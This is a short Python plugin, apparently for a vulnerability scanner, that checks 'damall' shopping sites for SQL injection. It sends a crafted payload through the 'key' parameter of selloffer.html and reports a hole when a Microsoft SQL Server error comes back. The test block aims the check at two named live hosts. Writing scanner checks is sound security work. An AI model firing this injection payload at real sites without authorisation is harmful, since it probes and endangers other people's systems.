#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0115170
#__Author__ = 上善若水
#_PlugName_ = damall_sql Plugin
#_FileName_ = damall_sql.py


def assign(service, arg):
    if service == "damall":
        return True, arg 	

def audit(arg):
    url = arg + "selloffer.html?key='%20and%20@@version=0%20or%20'%'='%"
    code, head, res, errcode, _url = curl.curl2(url)
    if code == 500 and 'Microsoft SQL Server' in res:
        security_hole(url)
			
    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('damall', 'http://www.damall.net/')[1])
    audit(assign('damall', 'http://mall.hicay.com/')[1])